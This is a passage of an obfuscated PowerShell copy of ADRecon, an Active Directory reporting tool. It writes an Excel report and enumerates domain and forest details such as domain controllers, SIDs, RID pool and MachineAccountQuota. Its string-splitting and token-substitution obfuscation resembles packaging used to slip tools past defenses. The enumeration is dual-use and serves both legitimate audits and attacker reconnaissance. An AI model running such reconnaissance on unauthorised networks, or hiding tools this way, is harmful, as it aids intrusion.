wRw5Di9XZ0Xbx5ZPxQ7mpQN4IjjiiVjpSTs/1XCJophMP6sBvmXzJXjzf/AK3/AFRKx'+'k5J2f6rhE0UwmH9WA3zL5krx5v/ANb/AKsblVUay79Ua2pCiMvHu/8A1v8Aqr0wehckJV1nQIw4uzs63js1Q4djQ/j1YTeP6sSkz/VVFL/fN/vn/vcwXuYokcFH/oxZs13/ALNd/wCrNn0ZxSPBZ2Xfn/8AAv1Zs+j/APT/AP/ZlEzj

        bLHbytes = [System.Convert]::FromBase64String(bLHbase64adrecon)
        Remove-Variable base64adrecon

        bLHCompanyLogo = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4ADRecon_Logo.jpgxfJ4)
		bLHp = New-Object IO.MemoryStream(bLHbytes, 0, bLHbytes.length)
		bLHp.Write(bLHbytes, 0, bLHbytes.length)
        Add-Type -AssemblyName System.Drawing
		bLHpicture = [System.Drawing.Image]::FromStream(bLHp, bLHtr'+'ue)
		bLHpicture.Save(bLHCompanyLogo)

        Remove-Variable bytes
        Remove-Variable p
        Remove-Variable picture

        bLHLinkToFile = bLHfalse
        bLHSaveWithDocument = bLHtrue
        bLHLeft = 0
        bLHTop = 0
        bLHWidth = 150
        bLHH'+'eight = 50

        # Add image to the Sheet
        bLHworksheet.Shapes.AddPicture(bLHCompanyLogo, bLHLinkToFile, bLHSaveWithDocument, bLHLeft, bLHTop, bLHWidth, bLHHeight) 0Ogv Out-Null

        Remove-Variable LinkToFile
        Remove-Variable SaveWithDocument
        Remove-Variable Left
        Remove-Variable Top
        Remove-Variable Width
        Remove-Variable Height

        If (Test-Path -Path bLHCompanyLogo)
        {
            Remove-Item bLHCompanyLogo
        }
        Remove-Variable CompanyLogo

        bLHrow = 5
        bLHcolumn = 1
        bLHworksheet.Cells.Item(bLHrow,bLHcolumn)= lEzjTable of ContentslEzj
        bLHw'+'orksheet.Cells.Item(bLHrow,bLHcolumn).Style = lEzjHeading 2lEzj
        bLHrow++

        For(bLHi=2; bLHi -le bLHworkbook.Worksheets.Count; bLHi++)
        {
            bLHworkbook.Worksheets.Item(1).Hyperlinks.Add(bLHworkbook.Worksheets.Item(1).Cells.Item(bLHrow,bLHcolumn) , lEzjlEzj , lEzjxfJ4bLH(bLHworkbook.Worksheets.Item(bLHi).Name)xfJ4!A1lEzj, lEzjlEzj, bLHworkbook.Worksheets.Item(bLHi).Name) 0Ogv Out-Null
            bLHrow++
        }

        bLHrow++
		bLHworkbook.Worksheets.Item(1).Hyperlinks.Add(bLHworkbook.Worksheets.Item(1).Cells.Item(bLHrow,1) , lEzjhttps://github.com/adrecon/ADReconlEzj, lEzjlEzj , lEzjlEzj, lEzjgithub.com/adrecon/ADReconlEzj) 0Ogv Out-Null

        bLHworksheet.UsedRange'+'.EntireColumn.AutoFit() 0Ogv Out-Null

  '+'      bLHexcel.Windows.Item(1).Displaygridlines = bLHfalse
        bLHexcel.ScreenUpdating = bLHtrue
        bLHADStatFileName = -join(bLHExcelPath,xfJ4cnIxfJ4,bLHDomainName,xfJ4ADRecon-Report.xlsxxfJ4)
        Try
        {
            # Disable prompt if file exists
            bLHexcel.DisplayAlerts = bLHFalse
            bLHworkbook.SaveAs(bLHADStatFileName)
            Write-Output lEzj[+] Excelsheet Saved to: bLHADStatFileNamelEzj
        }
        Catch
        {
            Write-Error lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }
        bLHexcel.Quit()
        Get-ADRExcelComObjRelease -ComObjtoRelease bLHworksheet -Final bLHtrue
        Remove-Variable worksheet
        Get-ADRExcelComObjRelease -ComObjtoRelease bLHworkbook -Final bLHtrue
        Remove-Variable -Name workbook -Scope Global
        Get'+'-ADRExcelComObjRelease -ComObjtoRelease bLHexcel -Final bLHtrue
        Remove-Variable -Name excel -Scope Global
    }
}

Function Get-ADRDomain
{
<#
.SYNOPSIS
    Returns information of the current (or specified) domain.

.DESCRIPTION
    Returns information of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
'+'#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomainRootDSE,

        [Parameter(Mandatory = bLHfalse)]
        [string] bLHDomainController,

        [Parameter(Mandatory = bLHfalse)]
        [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADDomain = Get-ADDoma'+'in
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRDomain] Error getting Domain ContextlEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }
        If (bLHADDomain)
        {
            bLHDomainObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            bLHFLAD = @{
	            0 = lEzjWindows2000lEzj;
	            1 = lEzjWindows2003/InterimlEzj;
	            2 = lEzjWindows2003lEzj;
	            3 = lEzjWindows2008lEzj;
	            4 = lEzjWindows2008R2lEzj;
	            5 = lEzjWindows2012lEzj;
	            6 = lEzjWindows2012R2lEzj;
	   '+'         7 = lEzjWindows2016lEzj
            }
            bLHDomainMode = bLHFLAD[[convert]::ToInt32(bLHADDomain.DomainMode)] + lEzjDomainlEzj
            Remove-Variable FLAD
            If (-Not bLHDomainMode)
            {
                bLHDomainMode = bLHADDomain.DomainMode
            }

            bLHObjValues = @(lEzjNamelEzj, bLHADDomain.DNSRoot, lEzjNetBIOSlEzj, bLHADDomain.NetBIOSName, lEzjFunctional LevellEzj, bLHDomainMode, lEzjDomainSIDlEzj, bLHADDomain.DomainSID.Value)

            For (bLHi = 0; bLHi -lt bLH(bLHObjValues.Count); bLHi++)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value bLHObjValues[bLHi]
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHObjValues[bLHi+1]
                bLHi++
                bLHDomainObj += bLHObj
            }
            Remove-Variable DomainMode

            For(bLHi=0; bLHi -lt bLHADDomain.ReplicaDirectoryServers.Count; bLHi++)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member'+' -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjDomain ControllerlEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHADDomain.ReplicaDirectoryServers[bLHi]
                bLHDomainObj += bLHObj
            }
            For(bLHi=0; bLHi -lt bLHADDomain.ReadOnlyReplicaDirectoryServers.Count; bLHi++)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjRead Only Domain ControllerlEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHADDomain.ReadOnlyReplicaDirectoryServers[bLHi]
                bLHDomainObj += bLHObj
            }

            Try'+'
            {
                bLHADForest = Get-ADForest bLHADDomain.Forest
            }
            Catch
            {
                Write-Verbose lEzj[Get-ADRDomain] Error getting Forest ContextlEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }

            If (-Not bLHADForest)
            {
                Try
                {
                    bLHADForest = Get-ADForest -Server bLHDomainController
                }
                Catch
                {
                    Write-Warning lEzj[Get-ADRDomain] Error getting Forest ContextlEzj
                    Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                }
            }
            If (bLHADForest)
            {
                bLHDomainCreation = Get-ADObject -SearchBase lEzjbLH(bLHADForest.PartitionsContainer)lEzj -LDAPFilter lEzj(&(objectClass=crossRef)(systemFlags=3)(Name=bLH(bLHADDomain.Name)))lEzj -Properties whenCreated
                If (-Not bLHDomainCreation)
                {
                    bLHDomainCreation = Get-ADObject -SearchBase lEzjbLH(bLHADForest.PartitionsContainer)lEzj -LDAPFilter lEzj(&(objectClass=crossRef)(systemFlags=3)(Name=bLH(bLHADDomain.NetBIOSName)))lEzj -Properties whenCreated
                }
                Remove-Variable ADForest
            }
            # Get RIDAvailablePool
            Try
            {
                bLHRIDManager = Get-ADObject -Identity lEzjCN=RID ManagerbLH,CN=System,bL'+'H(bLHADDomain.DistinguishedName)lEzj -Properties rIDAvailablePool
                bLHRIDproperty = bLHRIDManager.rIDAvailablePool
                [int32] bLHtotalSIDS = bLH(bLHRIDproperty) / ([math]::Pow(2,32))
                [int64] bLHtemp64val = bLHtotalSIDS * ([math]::Pow(2,32))
                bLHRIDsIssued = [int32](bLH(bLHRIDproperty) - bLHtemp64val)
               '+' bLHRIDsRemaining = bLHtotalSIDS - bLHRIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
 '+'           }
            Catch
            {
                Write-Warning lEzj[Get-ADRDomain] Error accessing CN=RID ManagerbLH,CN=System,bLH(bLHADDomain.DistinguishedName)lEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }
            If (bLHDomainCreation)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjCreation DatelEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHDomainCreation.whenCreated
                bLHDomainObj += bLHObj
                Remove-Variable DomainCreation
            }

            bLHObj = New-Object PSObject
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjms-DS-MachineAccountQuotalEzj
          '+'  bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLH((Get-ADObject -Identity (bLHADDomain.DistinguishedName) -Properties ms-DS-MachineAcc'+'ountQuota).xfJ4ms-DS-MachineAccountQuotaxfJ4)
            bLHDomainObj += bLHObj

            If (bLHRIDsIssued)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjRIDs IssuedlEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHRIDsIssued
                bLHDomainObj += bLHObj
                Remove-Variable RIDsIssued
            }
            If (bLHRIDsRemaining)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjRIDs RemaininglEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHRIDsRemaining
                bLHDomainObj += bLHObj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            bLHDomainFQDN = Get-DNtoFQDN(bLHobjDomain.distinguishedName)
            bLHDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(lEzjDomainlEzj,bLH(bLHDomainFQDN),bLH(bLHCredential.UserName),bLH(bLHCredential.GetNetworkCredential().password))
            Try
            {
                bLHADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(bLHDomainContext)
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRDomain] Error getting Domain ContextlEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
            Remove-Variable DomainContext
            # Get RIDAvailablePool
            Try
            {
                bLHSearchPath = lEzjCN=RID ManagerbLH,CN=SystemlEzj
                bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/bLHSearchPath,bLH(bLHobjDomain.distinguishedName)lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
                bLHobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
                bLHobjSearcherPath.PropertiesToLoad.AddRange((lEzjridavailablepoollEzj))
                bLHobjSearcherResult = bLHobjSearcherPath.FindAll()
                bLHRIDproperty = bLHobjSearcherResult.Properties.ridavailablepool
                [int32] bLHtotalSIDS = bLH(bLHRIDproperty) / ([math]::Pow(2,32))
                [int64] bLHtemp64val = bLHtotalSIDS * ([math]::Pow(2,32))
                bLHRIDsIssued = [int32](bLH(bLHRIDproperty) - bLHtemp64val)
                bLHRIDsRemaining = bLHtotalSIDS - bLHRIDsIssued
                Remove-Variable SearchPath
                bLHobjSearchPath.Dispose()
                bLHobjSearcherPath.Dispose()
                bLHobjSearcherResult.Dispose()
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRDomain] Error accessing CN=RID ManagerbLH,CN=System,bLH(bLHSearchPath),bLH(bLHobjDomain.distinguishedName)lEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }
            Try
            {
                bLHForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(lEzjForestlEzj,bLH(bLHADDomain.Forest),bLH(bLHCredential.UserName),bLH(bLHCredential.GetNetworkCredential().password))
                bLHADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(bLHForestContext)
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRDomain] Error getting Forest ContextlEzj
               '+' Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }
            If (bLHForestContext)
            {
                Remove-Variable ForestContext
            }
            If (bLHADForest)
            {
                bLHGlobalCatalog = bLHADForest.FindGlobalCatalog()
            }
            If (bLHGlobalCatalog)
            {
                bLHDN = lEzjGC://bLH(bLHGlobalCatalog.IPAddress)/bLH(bLHobjDomain.distinguishedname)lEzj
                Try
                {
                    bLHADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList (bLH(bLHDN),bLH(bLHCredential.UserName),bLH(bLHCredential.GetNetworkCredential().password))
                    bLHADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(bLHADObject.objectSid[0], 0)
                    bLHADObject.Dispose()
                }
                Catch
                {
                    Write-Warning lEzj[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog bLH(bLHGlobalCatalog.IPAddress). Using SID from the ObjDomain.lEzj
                    Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                    bLHADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(bLHobjDomain.objectSid[0], 0)
                }
            }
            Else
            {
                bLHADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(bLHobjDomain.objectSid[0], 0)
            }
        }
        Else
        {
            bLHADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            bLHADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            Try
            {
                bLHGlobalCatalog = bLHADForest.FindGlobalCatalog()
                bLHDN = lEzjGC://bLH(bLHGlobalCatalog)/bLH(bLHobjDomain.distinguishedname)lEzj
                bLHADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList (bLHDN)
                bLHADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(bLHADObject.objectSid[0], 0)
                bLHADObject.dispose()
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog bLH(bLHGlobalCatalog.IPAddress). Using SID from the ObjDomain.lEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                bLHADDomainSID = New-Object System.Security.Principal.SecurityIdentifier(bLHobjDomain.objectSid[0], 0)
            }
            # Get RIDAvailablePool
            Try
            {
                bLHRIDManage'+'r = ([ADSI]lEzjLDAP://CN=RID ManagerbLH,CN=System,bLH(bLHobjDomain.distinguishedName)lEzj)
                bLHRIDproperty = bLHObjDomain.ConvertLargeIntegerToInt64(bLHRIDManager.Properties.rIDAvailablePool.value)
                [int32] bLHtotalSIDS = bLH(bLHRIDproperty)'+' / ([math]::Pow(2,32))
                [int64] bLHtemp64val = bLHtotalSIDS * ([math]::Pow(2,32))
                bLHRIDsIssued = [int32](bLH(bLHRIDproperty) - bLHtemp64val)
                bLHRIDsRemaining = bLHtotalSIDS - bLHRIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRDomain] Error accessing CN=RID ManagerbLH,CN=System,bLH(bLHSearchPath),bLH(bLHobjDomain.distinguishedName)lEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }
        }

        If (bLHADDomain)
        {
            bLHDomainObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            bLHFLAD = @{
	            0 = lEzjWindows2000lEzj;
	            1 = lEzjWindows2003/InterimlEzj;
	            2 = lEzjWindows2003lEzj;
	            3 = lEzjWindows2008lEzj;
	            4 = lEzjWindows2008R2lEzj;
	            5 = lEzjWindows2012lEzj;
	            6 = lEzjWindows2012R2lEzj;
	            7 = lEzjWindows2016lEzj
            }
            bLHDomainMode = bLHFLAD[[convert]::ToInt32(bLHobjDomainRootDSE.domainFunctionality,10)] + lEzjDomainlEzj
            Remove-Variable FLAD

            bLHObjValues = @(lEzjNamelEzj, bLHADDomain.Name, lEzjNetBIOSlEzj, bLHobjDomain.dc.value, lEzjFunctional LevellEzj, bLHDomainMode, lEzjDomainSIDlEzj, bLHADDomainSID.Value)

            For (bLHi = 0; bLHi -lt bLH(bLHObjValues.Count); bLHi++)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value bLHObjValues[bLHi]
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHObjValues[bLHi+1]
                bLHi++
                bLHDomainObj += bLHObj
            }
            Remove-Variable DomainMode

            For(bLHi=0; bLHi -lt bLHADDomain.DomainControllers.Count; bLHi++)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjDomain ControllerlEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHADDo'+'main.DomainControllers[bLHi]
                bLHDomainObj += bLHObj
            }

            bLHObj = New-Object PSObject
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjCreation DatelEzj
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHobjDomain.whencreated.value
            bLHDomainObj += bLHObj

            bLHObj = New-Object PSObject
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjms-DS-MachineAccountQuotalEzj
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHobjDomain.xfJ4ms-DS-MachineAccountQuotaxfJ4.value
            bLHDomainObj += bLHObj

            If (bLHRIDsIssued)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjRIDs IssuedlEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHRIDsIssued
                bLHDomainObj += bLHObj
                Remove-Variable RIDsIssued
            }
            If (bLHRIDsRemaining)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjRIDs RemaininglEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHRIDsRemaining
                bLHDomainObj += bLHObj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If (bLHDomainObj)
    {
        Return bLHDomainObj
    }
    Else
    {
        Return bLHnull
    }
}

Function Get-ADRForest
{
<#
.SYNOPSIS
    Returns information of the current (or specified) forest.

.DESCRIPTION
    Returns information of the current (or specified) forest.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomainRootDSE,

        [Parameter(Mandatory = bLHfalse)]
        [string] bLHDomainController,

        [Parameter(Mandatory = bLHfalse)]
      '+'  [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            bLHADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRForest] Error getting Domain ContextlEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            Return bLHnull
        }

        Try
        {
            bLHADForest = Get-ADForest bLHADDomain.Forest
        }
        Catch
        {
            Write-Verbose l'+'Ezj[Get-ADRForest] Error getting Forest ContextlEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }
        Remove-Variable ADDomain

        If (-Not bLHADForest)
        {
            Try
            {
                bLHADForest = Get-ADForest -Server bLHDomainController
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRForest] Error getting Forest Context using Server parameterlEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                Return bLHnull
            }
        }

        If (bLHADForest)
        {
            # Get Tombstone Lifetime
            Try
            {
                bLHADForestCNC = (Get-ADRootDSE).configurationNamingContext
                bLHADForestDSCP = Get-ADObject -Identity lEzjCN=Directory Service,CN=Windows NT,CN=Services,bLH(bLHADForestCNC)lEzj -Partition bLHADForestCNC -Properties *
                bLHADForestTombstoneLifetime = bLHADForestDSCP.tombstoneLifetime
                Remove-Variable ADForestCNC
                Remove-Variable ADForestDSCP
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRForest] Error retrieving Tombstone LifetimelEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }

            # Check Recycle Bin Feature Status
            If ([convert]::ToInt32(bLHADForest.ForestMode) -ge 6)
            {
                Try
                {
                    bLHADRecycleBin = Get-ADOptionalFeature -Identity lEzjRecycle Bin FeaturelEzj
                }
                Catch
                {
                    Write-Warning lEzj[Get-ADRForest] Error retrieving Recycle Bin FeaturelEzj
   '+'                 Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                }
            }

            # Check Privileged Access Management Feature status
            If ([convert]::ToInt32(bLHADForest.ForestMode) -ge 7)
            {
                Try
                {
                    bLHPrivilegedAccessManagement = Get-ADOptionalFeature -Identity lEzjPrivileged Access Management FeaturelEzj
                }
                Catch
                {
                    Write-Warning lEzj[Get-ADRForest] Error retrieving Privileged Acceess Management FeaturelEzj
                    Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                }
            }

            bLHFores'+'tObj = @()

            # Values taken from https://technet.microsoft.com/en-us/library/hh852281(v=wps.630).aspx
            bLHFLAD = @{
                0 = lEzjWindows2000lEzj;
                1 = lEzjWindows2003/InterimlEzj;
                2 = lEzjWindows2003lEzj;
                3 = lEzjWindows2008lEzj;
                4 = lEzjWindows2008R2lEzj;
                5 = lEzjWindows2012lEzj;
                6 = lEzjWindows2012R2lEzj;
                7 '+'= lEzjWindows2016lEzj
            }
            bLHForestMode = bLHFLAD[[convert]::ToInt32(bLHADForest.ForestMode)] + lEzjForestlEzj
            Remove-Variable FLAD

            If (-Not bLHForestMode)
            {
                bLHForestMode = bLHADForest.ForestMode
            }

            bLHObjValues = @(lEzjNamelEzj, bLHADForest.Name, lEzjFunctional LevellEzj, bLHForestMode, lEzjDomain Naming MasterlEzj, bLHADForest.DomainNamingMaster, lEzjSchema MasterlEzj, bLHADForest.SchemaMaster, lEzjRootDomainlEzj, bLHADForest.RootDomain, lEzjDomain CountlEzj, bLHADForest.Domains.Count, lEzjSite CountlEzj, bLHADForest.Sites.Count, lEzjGlobal Catalog CountlEzj, bLHADForest.GlobalCatalogs.Count)

            For (bLHi = 0; bLHi -lt bLH(bLHObjValues.Count); bLHi++)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value bLHObjValues[bLHi]
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHObjValues[bLHi+1]
                bLHi++
                bLHForestObj += bLHObj
            }
            Remove-Variable ForestMode

            For(bLHi=0; bLHi -lt bLHADForest.Domains.Count; bLHi++)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjDomainlEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHADForest.Domains[bLHi]
                bLHForestObj += bLHObj
            }
            For(bLHi=0; bLHi -lt bLHADForest.Sites.Count; bLHi++)
            {
                bLHObj = New-Object PSObject
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjSitelEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHADForest.Sites[bLHi]
                bLHForestObj += bLHObj
            }
            For(bLHi=0; bLHi -lt bLHADForest.GlobalCatalogs.Count; bLHi++)
            {
                bLHObj = New-Object PSObjec'+'t
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjGlobalCataloglEzj
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHADForest.GlobalCatalogs[bLHi]
                bLHForestObj += bLHObj
            }

            bLHObj = New-Object PSObject
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjTombstone LifetimelEzj
            If (bLHADForestTombstoneLifetime)
            {
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHADForestTombstoneLifetime
                Remove-Variable ADForestTombsto'+'neLifetime
            }
            Else
            {
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value lEzjNot RetrievedlEzj
            }
            bLHForestObj += bLHObj

            bLHObj = New-Object PSObject
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjRecycle Bin (2'+'008 R2 onwards)lEzj
            If (bLHADRecycleBin)
            {
                If (bLHADRecycleBin.EnabledScopes.Count -gt 0)
                {
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value lEzjEnabledlEzj
                    bLHForestObj += bLHObj
                    For(bLHi=0; bLHi -lt bLH(bLHADRecycleBin.EnabledScopes.Count); bLHi++)
                    {
                        bLHObj = New-Object PSObject
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjEnabled ScopelEzj
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHADRecycleBin.EnabledScopes[bLHi]
                        bLHForestObj += bLHObj
                    }
                }
                Else
                {
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value lEzjDisabledlEzj
                    bLHForestObj += bLHObj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value lEzjDisabledlEzj
                bLHForestObj += bLHObj
            }

            bLHObj = New-Object PSObject
            bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjPrivileged Access Management (2016 onwards)lEzj
            If (bLHPrivilegedAccessManagement)
            {
                If (bLHPrivilegedAccessManagement.EnabledScopes.Count -gt 0)
                {
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value lEzjEnabledlEzj
                    bLHForestObj += bLHObj
                    For(bLHi=0; bLHi -lt bLH(bLHPrivilegedAccessManagement.EnabledScopes.Count); bLHi++)
                    {
                        bLHObj = New-Object PSObject
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjCategorylEzj -Value lEzjEnabled ScopelEzj
                        bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value bLHPrivilegedAccessManagement.EnabledScopes[bLHi]
                        bLHForest'+'Obj += bLHObj
                    }
                }
                Else
                {
                    bLHObj 0Ogv Add-Member -MemberType NoteProperty -Name lEzjValuelEzj -Value l'+'EzjDisabledlEzj
                    bLHForestObj += bLHObj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
